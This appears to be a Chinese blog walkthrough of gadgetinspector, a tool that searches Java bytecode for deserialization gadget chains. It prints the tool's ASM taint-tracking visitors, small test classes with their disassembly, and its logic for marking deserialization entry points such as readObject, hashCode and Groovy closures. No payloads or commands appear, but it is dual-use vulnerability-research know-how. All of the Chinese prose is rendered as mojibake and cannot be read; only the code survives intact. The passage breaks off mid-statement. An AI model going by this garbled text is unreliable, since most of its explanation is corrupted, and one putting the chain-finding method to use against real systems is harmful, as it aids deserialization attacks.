æ¥ä¸‹æ¥åœ¨éå†çš„æ¯ä¸ªæ–¹æ³•æ—¶ï¼Œä¼šå…ˆè·å–å®ƒçš„æ‰€å±ç±»ï¼Œä¼ å…¥å‡½æ•°PassthroughDataflowClassVisitorè¿›è¡ŒASMè®¿é—®è€…æ¨¡å¼çš„åˆ†æï¼Œè¿™é‡Œæˆ‘ä»¬ä¾ç„¶é‡ç‚¹å…³æ³¨çš„æ˜¯visitMethodå‡½æ•°ï¼Œè¿™é‡Œé¦–å…ˆéœ€è¦ç›®æ ‡æ˜¯éœ€è¦è§‚å¯Ÿçš„methodï¼Œå¦åˆ™è·³è¿‡ ä¹‹åä¼šä¼ å…¥PassthroughDataflowMethodVisitoråšè¿›ä¸€æ­¥çš„å¤„ç†ï¼Œåœ¨JSRInlinerAdapterçš„æœ€åæ‰§è¡ŒvisitEndä¼šè§¦å‘è¿™ä¸ªè§‚å¯Ÿè¿‡ç¨‹ï¼ŒçŒœæµ‹è¿™æ ·åšçš„ç›®çš„æ˜¯ä¾¿äºç­›é€‰ï¼Œä¾¿äºè§‚å¯Ÿç›®çš„ç±» é‚£ä¹ˆæˆ‘ä»¬æ¥å…·ä½“çœ‹çœ‹è¿™ä¸ªPassthroughDataflowMethodVisitorç±»ï¼Œé¦–å…ˆå®ƒæ˜¯ç»§æ‰¿äºçˆ¶ç±»TaintTrackingMethodVisitor,é¦–å…ˆæ˜¯visitCodeå‡½æ•°ï¼Œå¾ˆç®€å•å°±æ˜¯ä¸ºäº†æ¨¡æ‹Ÿæœ¬åœ°å˜é‡è¡¨å’Œæ“ä½œæ•°æ ˆçš„å˜åŒ– 12345678910111213141516171819public void visitCode() &#123; super.visitCode(); int localIndex = 0; int argIndex = 0; if ((this.access &amp; Opcodes.ACC_STATIC) == 0) &#123; //éé™æ€æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå±€éƒ¨å˜é‡åº”è¯¥ä¸ºå¯¹è±¡å®ä¾‹this //æ·»åŠ åˆ°æœ¬åœ°å˜é‡è¡¨é›†åˆ setLocalTaint(localIndex, argIndex); localIndex += 1; argIndex += 1; &#125; for (Type argType : Type.getArgumentTypes(desc)) &#123; //åˆ¤æ–­å‚æ•°ç±»å‹ï¼Œå¾—å‡ºå˜é‡å ç”¨ç©ºé—´å¤§å°ï¼Œç„¶åå­˜å‚¨ setLocalTaint(localIndex, argIndex); localIndex += argType.getSize(); argIndex += 1; &#125;&#125; ä¹‹åçš„visitInsnæ–¹æ³•(æ¯å½“è®¿é—®æ— æ“ä½œæ•°çš„æŒ‡ä»¤ï¼Œä¾‹å¦‚nopï¼Œduoç­‰ç­‰ï¼ŒASMéƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€è¦å…³æ³¨è¿”å›å€¼çš„éƒ¨åˆ†lol) 1234567891011121314151617181920@Overridepublic void visitInsn(int opcode) &#123; switch(opcode) &#123; case Opcodes.IRETURN://ä»å½“å‰æ–¹æ³•è¿”å›int case Opcodes.FRETURN://ä»å½“å‰æ–¹æ³•è¿”å›float case Opcodes.ARETURN://ä»å½“å‰æ–¹æ³•è¿”å›å¯¹è±¡å¼•ç”¨ returnTaint.addAll(getStackTaint(0));//æ ˆç©ºé—´ä»å†…å­˜é«˜ä½åˆ°ä½ä½åˆ†é…ç©ºé—´ break; case Opcodes.LRETURN://ä»å½“å‰æ–¹æ³•è¿”å›long case Opcodes.DRETURN://ä»å½“å‰æ–¹æ³•è¿”å›double returnTaint.addAll(getStackTaint(1)); break; case Opcodes.RETURN://ä»å½“å‰æ–¹æ³•è¿”å›void break; default: break; &#125; super.visitInsn(opcode);&#125; ä¹‹åè¿˜æœ‰ä¸ªé‡è¦çš„å°±æ˜¯visitMethodInsn(åœ¨æ–¹æ³•ä½“å†…ï¼Œè°ƒç”¨äº†å…¶ä»–æ–¹æ³•ï¼Œéƒ½ä¼šè§¦å‘è¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨)ï¼Œè¿™é‡Œé€»è¾‘ä¹Ÿä¸éš¾ä½†æ˜¯ä¸ºäº†æ¢³ç†é€»è¾‘è¿™é‡Œå…ˆä¸è°ˆï¼Œä¹‹åæˆ‘ä»¬ä»¥å¼€é¢˜æåˆ°çš„ä»£ç æ¥åšè®²è§£ é¦–å…ˆå¯ä»¥çœ‹åˆ°é€†æ‹“æ‰‘æ’åºçš„ç»“æœä»¥åŠå¯è¢«æ±¡æŸ“çš„ä½ç½®ï¼Œ é‚£ä¹ˆå…·ä½“è·Ÿå…¥è¿™ä¸ªè¿‡ç¨‹åˆ†æ ç¬¬ä¸€æ­¥ï¼Œé¦–å…ˆæ˜¯å¯¹C.method3è¿›è¡Œè§‚å¯Ÿï¼ŒèŠ‚çº¦çº¸å¼ ä¸åºŸè¯ï¼Œé¦–å…ˆæ˜¯åˆ°gadgetinspector.PassthroughDiscovery.PassthroughDataflowClassVisitor#visitMethodç­›é€‰ç›®æ ‡ç±»ï¼Œä¹‹åä¼ å…¥åˆ°PassthroughDataflowMethodVisitorå½“ä¸­åšè¿›ä¸€æ­¥çš„è§‚å¯Ÿï¼Œç”±äºmethod3æ–¹æ³•ä½“æ¯”è¾ƒç®€å•ï¼Œåªæ˜¯è¿”å›ä¼ å…¥çš„å‚æ•° 12345class C &#123; public String method3(String param) &#123; return param; &#125;&#125; ç”±äºåœ¨æ–¹æ³•ä½“å†…å­—èŠ‚ç æ“ä½œäº†å˜é‡ï¼Œå› æ­¤ä¼šè°ƒç”¨visitVarInsnï¼Œä¹Ÿå°±æ˜¯åœ¨gadgetinspector.TaintTrackingMethodVisitor#visitVarInsnï¼Œåœ¨è¿™é‡Œè¿”å›å˜é‡è§¦å‘äº†aloadæ“ä½œæŒ‡ä»¤ï¼Œè¿™é‡Œä¼šå°†è¿”å›å‚æ•°å¯¹åº”çš„æœ¬åœ°å˜é‡æ¨é€è‡³æ ˆé¡¶ ä¹‹åå¯¹åº”çš„ARETURNæŒ‡ä»¤ä¼šè§¦å‘è°ƒç”¨gadgetinspector.PassthroughDiscovery.PassthroughDataflowMethodVisitor#visitInsnï¼Œè¿™é‡Œå°†æ±¡æŸ“çš„å˜é‡ä¿å­˜åˆ°returnTaintå˜é‡å½“ä¸­ï¼Œè¿™é‡Œè¿”å›longå’Œdoubleçš„å’Œä¸Šé¢ä¸ä¸€æ ·ä¸»è¦æ˜¯å› ä¸ºå®ƒä»¬å ä¸¤ä¸ªä½ç½® è‡³æ­¤æˆ‘ä»¬çš„ç¬¬ä¸€æ­¥method3ä¹Ÿå°±ç»“æŸäº†ï¼Œä¹‹åå°±æ˜¯å°†å…¶ç¼“å­˜åˆ°passthroughDataflowå½“ä¸­ æ¥ä¸‹æ¥ç¬¬äºŒæ­¥ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨B.method2æ–¹æ³•ï¼Œè¿™ä¸ªç¨å¾®å¤æ‚ä¸€ç‚¹ï¼Œç»“åˆå¯¹åº”çš„æ±‡ç¼–æ¥ç†è§£å‘— 123456789public java.lang.String method2(java.lang.String); Code: 0: new #2 // class yyds/C 3: dup 4: invokespecial #3 // Method yyds/C.&quot;&lt;init&gt;&quot;:()V 7: aload_1 8: invokevirtual #4 // Method yyds/C.method3:(Ljava/lang/String;)Ljava/lang/String; 11: areturn è·³å¼€ç¬¬ä¸€æ­¥newï¼Œä¹‹ådupä¼šè§¦å‘gadgetinspector.TaintTrackingMethodVisitor#visitInsnï¼Œåšçš„æ“ä½œä¹Ÿå¾ˆeasyï¼Œå¯èƒ½è§‰å¾—è¿™ä¸ªå¾ˆä¸å¯æ€è®®å¾ˆéš¾ç†è§£ï¼ŒdupæŒ‡ä»¤éƒ¨åˆ†å¯ä»¥æ‹‰åˆ°æœ€ä¸‹é¢çœ‹çœ‹é¢˜å¤–è¯éƒ¨åˆ†å‘¢ 123case Opcodes.DUP: push(get(0)); break; ä¹‹åINVOKESPECIALä¼šè§¦å‘visitMethodInsnï¼Œå½“ç„¶è‚‰çœ¼å¯çŸ¥å®ä¾‹åŒ–Cçš„æ—¶å€™ä¸æˆ‘ä»¬æ— å…³æ²¡å•¥å¥½åº·çš„ï¼Œä¹‹ååˆæ˜¯aload_1å»è§¦å‘visitVarInsnçš„è¿‡ç¨‹ï¼Œè¿™é‡Œé€»è¾‘ç±»ä¼¼æˆ‘ä»¬ç¬¬ä¸€æ­¥è®²çš„é‚£æ ·æ²¡å•¥å¥½è¯´çš„å‘—ï¼Œä¹‹ååˆæ˜¯invokevirtualè§¦å‘visitMethodInsnçš„è°ƒç”¨ä¹Ÿå°±æ˜¯new C().method3()ä¸­è°ƒç”¨æ–¹æ³•3çš„è¿‡ç¨‹ï¼Œè™½ç„¶ç»“åˆæ³¨é‡Šä¹Ÿæ˜¯èƒ½çœ‹æ‡‚çš„è¿™é‡Œä¹Ÿç®€å•è¯´è¯´ é¦–å…ˆè·å–methodå‚æ•°ç±»å‹ï¼Œç”±äºæ˜¯éé™æ€æ–¹æ³•ä¼šè¿›å…¥ifæ¡ä»¶ ä¹‹åæ„é€ äº†æ±¡æŸ“å‚æ•°é›†åˆï¼Œforå¾ªç¯å½“ä¸­æ ¹æ®å‚æ•°ç±»å‹å¤§å°ï¼Œä»æ ˆåº•è·å–å…¥å‚ï¼Œå‚æ•°å…¥æ ˆæ˜¯ä»å³åˆ°å·¦çš„ ç”±äºä¸æ˜¯æ„é€ å‡½æ•°ï¼Œä¼šæ–°å»ºä¸€ä¸ªHashSetç”¨äºä¿å­˜æ±¡æŸ“å‚æ•°çš„è¿”å›å€¼ ä¹‹ååˆ¤æ–­æ˜¯å¦å’ŒåŒä¸€æ–¹æ³•ä½“å†…çš„å…¶å®ƒæ–¹æ³•è¿”å›å€¼å…³è”ï¼Œæœ‰å…³è”åˆ™æ·»åŠ åˆ°æ ˆåº•ï¼Œç­‰å¾…æ‰§è¡Œreturnæ—¶ä¿å­˜ è‡³æ­¤æˆ‘ä»¬ä¹Ÿå¾—åˆ°äº†æˆ‘ä»¬å¯ä»¥æ±¡æŸ“B.method2ï¼Œæ§åˆ¶è¿”å›å€¼ ä¹‹åA.method1åŒC.method3å°±ä¸å†é‡å¤ï¼Œæœ€ååˆ†æçš„æ˜¯mainæ–¹æ³•çš„å…¥å‚argsæ˜¯å¦ä¼šæ±¡æŸ“åˆ°å…¶è¿”å›å€¼ï¼Œä¹Ÿå…¶å®å·®ä¸å¤šï¼Œæ²¡å¿…è¦å†æµªè´¹ç¬”å¢¨äº†ï¼Œçœ‹çœ‹ä¸‹é¢åæ±‡ç¼–ä»£ç å³å¯ï¼Œæœ‰å…´è¶£å¯ä»¥è‡ªå·±æ›´å…¥å…·ä½“è¿‡ç¨‹çœ‹çœ‹ 12345678910111213Code: 0: new #2 // class yyds/A 3: dup 4: invokespecial #3 // Method yyds/A.&quot;&lt;init&gt;&quot;:()V 7: aload_1 8: invokevirtual #4 // Method yyds/A.method1:(Ljava/lang/String;)Ljava/lang/String; 11: astore_2 12: new #5 // class yyds/B 15: dup 16: invokespecial #6 // Method yyds/B.&quot;&lt;init&gt;&quot;:()V 19: aload_2 20: invokevirtual #7 // Method yyds/B.method2:(Ljava/lang/String;)Ljava/lang/String; 23: areturn è‡³æ­¤æˆ‘ä»¬å¾—åˆ°äº†å¦‚ä¸‹çš„ç»“æœ 1234yyds/C method3 (Ljava/lang/String;)Ljava/lang/String; 1,yyds/B method2 (Ljava/lang/String;)Ljava/lang/String; 1,yyds/A method1 (Ljava/lang/String;)Ljava/lang/String; 1,yyds/Main main (Ljava/lang/String;)Ljava/lang/String; 1, CallGraphDiscoveryè¿™ä¸ªç±»ä¸»è¦æ˜¯ä¸ºäº†æ£€æŸ¥å­æ–¹æ³•çš„å‚æ•°æ˜¯å¦å¯ä»¥è¢«çˆ¶æ–¹æ³•çš„å‚æ•°æ‰€å½±å“ ä¹Ÿæ˜¯ä»åˆ›å®‡å½“ä¸­çš„ä¾‹å­å¼€å§‹ 123456789private MyObject obj;public void parentMethod(Object arg)&#123; ... TestObject obj1 = new TestObject(); Object obj2 = obj1.childMethod1(arg); this.obj.childMethod(obj2); ...&#125; å…¶ä¸­å¦‚æœæ²¡æœ‰ç”Ÿæˆpassthroughæ•°æ®æµæ“ä½œï¼Œå°±æ— æ³•åˆ¤æ–­childMethod1çš„è¿”å›å€¼æ˜¯å¦ä¼šå—åˆ°å‚æ•°argçš„å½±å“ï¼Œä¹Ÿå°±æ— æ³•ç»§ç»­åˆ¤æ–­parentMethodçš„argå‚æ•°ä¸å­æ–¹æ³•MyObject.childmethodçš„å‚æ•°ä¼ é€’å…³ç³» ä¹Ÿæ˜¯å…ˆçœ‹åŸä½œè€…çš„ä¾‹å­ä»¥åŠåˆ›å®‡çš„å¸ˆå‚…çš„åŸæ–‡å¸®åŠ©ç†è§£ AbstractTableModel$ff19274a.hashcodeä¸å­æ–¹æ³•IFn.invokeï¼š AbstractTableModel$ff19274a.hashcodeçš„this(0å‚)ä¼ é€’ç»™äº†IFn.invokeçš„1å‚ï¼Œè¡¨ç¤ºä¸º0-&gt;IFn.invoke()@1 ç”±äºfæ˜¯é€šè¿‡this.__clojureFnMap(0å‚)è·å–çš„ï¼Œè€Œfåˆä¸ºIFn.invoke()çš„this(0å‚)ï¼Œå³AbstractTableModel$ff19274a.hashcodeçš„0å‚ä¼ é€’ç»™äº†IFn.invokeçš„0å‚ï¼Œè¡¨ç¤ºä¸º0-&gt;IFn.invoke()@0 FnCompose.invokeä¸å­æ–¹æ³•IFn.invokeï¼š FnCompose.invokedçš„arg(1å‚)ä¼ é€’ç»™äº†IFn.invokeçš„1å‚ï¼Œè¡¨ç¤ºä¸º1-&gt;IFn.invoke()@1 f1ä¸ºFnComposeçš„å±æ€§(thisï¼Œ0å‚)ï¼Œè¢«åšä¸ºäº†IFn.invokeçš„this(0å‚æ•°)ä¼ é€’ï¼Œè¡¨ç¤ºä¸º0-&gt;IFn.invoke()@1 f1.invoke(arg)åšä¸ºä¸€ä¸ªæ•´ä½“è¢«å½“ä½œ1å‚ä¼ é€’ç»™äº†IFn.invokeï¼Œç”±äºf1åœ¨åºåˆ—åŒ–æ—¶æˆ‘ä»¬å¯ä»¥æ§åˆ¶å…·ä½“æ˜¯IFnçš„å“ªä¸ªå®ç°ç±»ï¼Œæ‰€ä»¥å…·ä½“è°ƒç”¨å“ªä¸ªå®ç°ç±»çš„invokeä¹Ÿç›¸å½“äºèƒ½å¤Ÿæ§åˆ¶ï¼Œå³f1.invoke(arg)è¿™ä¸ªæ•´ä½“å¯ä»¥è§†ä¸º0å‚æ•°ä¼ é€’ç»™äº†IFn.invokeçš„1å‚(è¿™é‡Œåªæ˜¯è¿›è¡Œçš„ç®€å•çŒœæµ‹ï¼Œå…·ä½“å®ç°åœ¨å­—èŠ‚ç åˆ†æä¸­ï¼Œå¯èƒ½ä¹Ÿä½“ç°äº†ä½œè€…è¯´çš„åˆç†çš„é£é™©åˆ¤æ–­å§)ï¼Œè¡¨ç¤ºä¸º0-&gt;IFn.invoke()@1 å¥½å§è¿”å›æ­£é¢˜ï¼Œæ¥åˆ°gadgetinspector.CallGraphDiscovery#discover ä¼šéå†æ¯ä¸€ä¸ªclassï¼Œå¹¶ä¼ å…¥ModelGeneratorClassVisitorè¿›è¡Œè§‚å¯Ÿï¼Œä¸€æ ·çš„è¿™é‡ŒåŠ ç‚¹ä»£ç è·³è¿‡å¯¹æ„é€ å‡½æ•°çš„è§‚å¯Ÿ é¦–å…ˆæ˜¯å¯¹Bç±»è¿›è¡Œè§‚å¯Ÿï¼Œè¿˜æ˜¯å†åˆ—ä¸€æ¬¡åæ±‡ç¼–ä»£ç  Code: 0: new #2 // class yyds/C 3: dup 4: invokespecial #3 // Method yyds/C.&quot;&lt;init&gt;&quot;:()V 7: aload_1 8: invokevirtual #4 // Method yyds/C.method3:(Ljava/lang/String;)Ljava/lang/String; 11: areturn é•¿è¯çŸ­è¯´ï¼Œä¸‡ç‰©ä¹‹æºè‚¯å®šè¿˜æ˜¯visitCodeï¼Œå¯ä»¥çœ‹åˆ°å¯¹äºå¯¹äºéé™æ€æ–¹æ³•ä¼šé¢å¤–å¤šä¸€ä¸ªarg0ï¼Œä¸éœ€è¦ç†è§£ï¼Œæœ¬æ¥Javaåº•å±‚å°±æ˜¯è¿™æ ·å­å¤„ç†æ»´ 123456789101112131415161718@Overridepublic void visitCode() &#123; super.visitCode(); int localIndex = 0; int argIndex = 0; //ä½¿ç”¨argå‰ç¼€æ¥è¡¨ç¤ºæ–¹æ³•å…¥å‚ï¼Œåç»­ç”¨äºåˆ¤æ–­æ˜¯å¦ä¸ºç›®æ ‡è°ƒç”¨æ–¹æ³•çš„å…¥å‚ if ((this.access &amp; Opcodes.ACC_STATIC) == 0) &#123; setLocalTaint(localIndex, &quot;arg&quot; + argIndex); localIndex += 1; argIndex += 1; &#125; for (Type argType : Type.getArgumentTypes(desc)) &#123; setLocalTaint(localIndex, &quot;arg&quot; + argIndex); localIndex += argType.getSize(); argIndex += 1; &#125;&#125; æ ¹æ®æ±‡ç¼–ç”±äºä¼šè°ƒç”¨åˆ°invokevirtual,æœ€ç»ˆä¼šè§¦å‘gadgetinspector.CallGraphDiscovery.ModelGeneratorMethodVisitor#visitMethodInsnçš„è°ƒç”¨ï¼Œè¿™é‡Œé¢å°±ä¼šè®°å½•æœ€ç»ˆç»“æœï¼Œåœ¨ä»£ç å½“ä¸­æœ‰ä¸€äº›ç®€å•çš„è¿‡æ»¤ï¼Œæ¯”å¦‚è¿™ä¸ªargï¼Œå°±æ˜¯ä¸ºäº†ä¿è¯å‚æ•°ä¸ºå½“å‰æ–¹æ³•çš„å…¥å‚ ä¹‹åä¾¿ä¼šåœ¨å‚æ•°discoveredCallså½“ä¸­è®°å½•å‚æ•°æµåŠ¨å…³ç³» å½“ç„¶åé¢æ‰å‘ç°è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç»†èŠ‚çš„ç‚¹ï¼Œæˆ‘ä»¬åŠ å¼ºéš¾åº¦ï¼Œå¦‚æœä»£ç æ”¹ä¸ºè¿™æ ·ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ä¸Šé¢åŸºç¡€ä¸Šåªæ˜¯åŠ äº†ä¸ªæˆå‘˜å˜é‡ 1234567891011121314151617181920212223package yyds;import java.io.IOException;public class Test &#123; private String name; public static void main(String[] args) &#123; &#125; public void main(String args) throws IOException &#123; new AA().method1(args, name); &#125;&#125;class AA &#123; public String method1(String param, String param2) &#123; return param + param2; &#125;&#125; çœ‹çœ‹ä»–çš„åæ±‡ç¼– 12345678910Code: 0: new #2 // class yyds/AA 3: dup 4: invokespecial #3 // Method yyds/AA.&quot;&lt;init&gt;&quot;:()V 7: aload_1 8: aload_0 9: getfield #4 // Field name:Ljava/lang/String; 12: invokevirtual #5 // Method yyds/AA.method1:(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String; 15: pop 16: return å…¶å®å’Œä¸Šé¢åˆ†æè¿‡ç¨‹å·®ä¸å¤šçš„ï¼Œå”¯ä¸€å¤šäº†ä¸ªåŒºåˆ«å°±æ˜¯å¤šäº†ä¸ªæ±‡ç¼–æŒ‡ä»¤getfieldçš„è°ƒç”¨ï¼Œä¹Ÿå› æ­¤ä¼šè§¦å‘visitFieldInsnï¼Œæˆ‘ä»¬å…·ä½“æ¥çœ‹çœ‹gadgetinspector.CallGraphDiscovery.ModelGeneratorMethodVisitor#visitFieldInsnï¼Œå…¶å®å°±æ˜¯åˆ¤æ–­å­—æ®µæ˜¯å¦æ˜¯transientçš„ï¼Œé€»è¾‘ä¹Ÿå¾ˆç®€å•ï¼Œçœ‹æ³¨é‡Šå³å¯ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public void visitFieldInsn(int opcode, String owner, String name, String desc) &#123; switch (opcode) &#123; case Opcodes.GETSTATIC: break; case Opcodes.PUTSTATIC: break; case Opcodes.GETFIELD://å…¥æ“ä½œæ ˆ Type type = Type.getType(desc); if (type.getSize() == 1) &#123; Boolean isTransient = null; // If a field type could not possibly be serialized, it&#x27;s effectively transient if (!couldBeSerialized(serializableDecider, inheritanceMap, new ClassReference.Handle(type.getInternalName()))) &#123; isTransient = Boolean.TRUE; &#125; else &#123; ClassReference clazz = classMap.get(new ClassReference.Handle(owner)); while (clazz != null) &#123; for (ClassReference.Member member : clazz.getMembers()) &#123; if (member.getName().equals(name)) &#123; isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != 0; break; &#125; &#125; if (isTransient != null) &#123; break; &#125; clazz = classMap.get(new ClassReference.Handle(clazz.getSuperClass())); &#125; &#125; Set&lt;String&gt; newTaint = new HashSet&lt;&gt;(); if (!Boolean.TRUE.equals(isTransient)) &#123; for (String s : getStackTaint(0)) &#123; newTaint.add(s + &quot;.&quot; + name); &#125; &#125; super.visitFieldInsn(opcode, owner, name, desc); //åœ¨è°ƒç”¨æ–¹æ³•å‰ï¼Œéƒ½ä¼šå…ˆå…¥æ ˆï¼Œä½œä¸ºå‚æ•° setStackTaint(0, newTaint); return; &#125; break; case Opcodes.PUTFIELD: break; default: throw new IllegalStateException(&quot;Unsupported opcode: &quot; + opcode); &#125; super.visitFieldInsn(opcode, owner, name, desc);&#125; è¿™ä¸€éƒ¨åˆ†ä¹Ÿç®—å®Œç»“äº† SourceDiscoveryåœ¨gadgetinspectorä¸­ï¼Œå­˜åœ¨ç€å¤šä¸ªSourceDiscoveryçš„å®ç°ï¼Œæœ‰jacksonçš„ï¼ŒjavaåŸç”Ÿåºåˆ—åŒ–çš„ç­‰ç­‰ï¼Œæˆ‘è¿™é‡Œä¸»è¦ä»¥jacksonçš„SourceDiscoveryå®ç°å¼€å§‹åˆ†æ é¦–å…ˆåœ¨SourceDiscoveryæŠ½è±¡ç±»çš„discoverå½“ä¸­ï¼Œå…ˆæ˜¯åŠ è½½äº†æ‰€æœ‰çš„ç±»ã€æ–¹æ³•ã€ç»§æ‰¿å®ç°å…³ç³»çš„æ•°æ® 12345678910111213141516171819public void discover() throws IOException &#123; Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses(); Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods(); InheritanceMap inheritanceMap = InheritanceMap.load(); Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = new HashMap&lt;&gt;(); for (GraphCall graphCall : DataLoader.loadData(Paths.get(&quot;callgraph.dat&quot;), new GraphCall.Factory())) &#123; MethodReference.Handle caller = graphCall.getCallerMethod(); if (!graphCallMap.containsKey(caller)) &#123; Set&lt;GraphCall&gt; graphCalls = new HashSet&lt;&gt;(); graphCalls.add(graphCall); graphCallMap.put(caller, graphCalls); &#125; else &#123; graphCallMap.get(caller).add(graphCall); &#125; &#125; discover(classMap, methodMap, inheritanceMap, graphCallMap);&#125; æ¥ä¸‹æ¥è°ƒç”¨discoveråœ¨å®ç°ç±»gadgetinspector.javaserial.SimpleSourceDiscovery#discover,ä¸»è¦æ˜¯æ”¶é›†å¯ç”¨çš„sourceï¼Œé€»è¾‘ä¹Ÿå¾ˆç®€å•äº† 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public void discover(Map&lt;ClassReference.Handle, ClassReference&gt; classMap, Map&lt;MethodReference.Handle, MethodReference&gt; methodMap, InheritanceMap inheritanceMap) &#123; final SerializableDecider serializableDecider = new SimpleSerializableDecider(inheritanceMap); for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123; if (method.getName().equals(&quot;finalize&quot;) &amp;&amp; method.getDesc().equals(&quot;()V&quot;)) &#123; addDiscoveredSource(new Source(method, 0)); &#125; &#125; &#125; // If a class implements readObject, the ObjectInputStream passed in is considered tainted for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123; if (method.getName().equals(&quot;readObject&quot;) &amp;&amp; method.getDesc().equals(&quot;(Ljava/io/ObjectInputStream;)V&quot;)) &#123; addDiscoveredSource(new Source(method, 1)); &#125; &#125; &#125; // Using the proxy trick, anything extending serializable and invocation handler is tainted. for (ClassReference.Handle clazz : classMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(clazz)) &amp;&amp; inheritanceMap.isSubclassOf(clazz, new ClassReference.Handle(&quot;java/lang/reflect/InvocationHandler&quot;))) &#123; MethodReference.Handle method = new MethodReference.Handle( clazz, &quot;invoke&quot;, &quot;(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;&quot;); addDiscoveredSource(new Source(method, 0)); &#125; &#125; // hashCode() or equals() are accessible entry points using standard tricks of putting those objects // into a HashMap. for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123; if (method.getName().equals(&quot;hashCode&quot;) &amp;&amp; method.getDesc().equals(&quot;()I&quot;)) &#123; addDiscoveredSource(new Source(method, 0)); &#125; if (method.getName().equals(&quot;equals&quot;) &amp;&amp; method.getDesc().equals(&quot;(Ljava/lang/Object;)Z&quot;)) &#123; addDiscoveredSource(new Source(method, 0)); addDiscoveredSource(new Source(method, 1)); &#125; &#125; &#125; // Using a comparator proxy, we can jump into the call() / doCall() method of any groovy Closure and all the // args are tainted. // https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference())) &amp;&amp; inheritanceMap.isSubclassOf(method.getClassReference(), new ClassReference.Handle(&quot;groovy/lang/Closure&quot;)) &amp;&amp; (method.getName().equals(&quot;call&quot;) || method.getName().equals(&quot;doCall&quot;))) &#123; addDiscoveredSource(new Source(method, 0)); Type[] methodArgs = Type.getArgumentTypes(method.getDesc()); for (int i = 0; i &lt; methodArgs.length; i++) &#123; addDiscoveredSource(new Source(method, i + 1)); &#125; &#125; &#125; &#125; GadgetChainDiscoveryæ¥ä¸‹æ¥å°±æ˜¯æœ€é‡è¦çš„ç”Ÿæˆåˆ©ç”¨é“¾çš„éƒ¨åˆ†äº†ï¼Œè¿™éƒ¨åˆ†æ•´åˆäº†ä¸Šé¢æ‰€æœ‰çš„ä¿¡æ¯ï¼Œä¼šéå†å…¨éƒ¨çš„sourceï¼Œå¹¶åœ¨callgraph.datä¸­é€’å½’æŸ¥æ‰¾æ‰€æœ‰å¯ä»¥ç»§ç»­ä¼ é€’æ±¡ç‚¹å‚æ•°çš„å­æ–¹æ³•è°ƒç”¨ï¼Œç›´è‡³é‡åˆ°sinkæ ‡è®°çš„æ–¹æ³•ï¼Œçœ‹çœ‹discoverå³å¯ï¼Œå¸¦äº†å¤‡æ³¨ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108public void discover() throws Exception &#123; //æ–¹æ³•ä¿¡æ¯ Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods(); InheritanceMap inheritanceMap = InheritanceMap.load(); //å¾—åˆ°æ–¹æ³•çš„æ‰€æœ‰å­ç±»æ–¹æ³•å®ç° Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations( inheritanceMap, methodMap); final ImplementationFinder implementationFinder = config.getImplementationFinder( methodMap, methodImplMap, inheritanceMap); //å†™å…¥æ–‡ä»¶ try (Writer writer = Files.newBufferedWriter(Paths.get(&quot;methodimpl.dat&quot;))) &#123; for (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodImplMap.entrySet()) &#123; writer.write(entry.getKey().getClassReference().getName()); writer.write(&quot;\\t&quot;); writer.write(entry.getKey().getName()); writer.write(&quot;\\t&quot;); writer.write(entry.getKey().getDesc()); writer.write(&quot;\\n&quot;); for (MethodReference.Handle method : entry.getValue()) &#123; writer.write(&quot;\\t&quot;); writer.write(method.getClassReference().getName()); writer.write(&quot;\\t&quot;); writer.write(method.getName()); writer.write(&quot;\\t&quot;); writer.write(method.getDesc()); writer.write(&quot;\\n&quot;); &#125; &#125; &#125; //æ–¹æ³•è°ƒç”¨mapï¼Œkeyä¸ºçˆ¶æ–¹æ³•ï¼Œvalueä¸ºå­æ–¹æ³•ä¸çˆ¶æ–¹æ³•å‚æ•°ä¼ é€’å…³ç³» Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = new HashMap&lt;&gt;(); for (GraphCall graphCall : DataLoader.loadData(Paths.get(&quot;callgraph.dat&quot;), new GraphCall.Factory())) &#123; MethodReference.Handle caller = graphCall.getCallerMethod(); if (!graphCallMap.containsKey(caller)) &#123; Set&lt;GraphCall&gt; graphCalls = new HashSet&lt;&gt;(); graphCalls.add(graphCall); graphCallMap.put(caller, graphCalls); &#125; else &#123; graphCallMap.get(caller).add(graphCall); &#125; &#125; //exploredMethodsä¿å­˜åœ¨è°ƒç”¨é“¾ä»æŸ¥æ‰¾è¿‡ç¨‹ä¸­å·²ç»è®¿é—®è¿‡çš„æ–¹æ³•èŠ‚ç‚¹ï¼ŒmethodsToExploreä¿å­˜è°ƒç”¨é“¾ Set&lt;GadgetChainLink&gt; exploredMethods = new HashSet&lt;&gt;(); LinkedList&lt;GadgetChain&gt; methodsToExplore = new LinkedList&lt;&gt;(); for (Source source : DataLoader.loadData(Paths.get(&quot;sources.dat&quot;), new Source.Factory())) &#123; GadgetChainLink srcLink = new 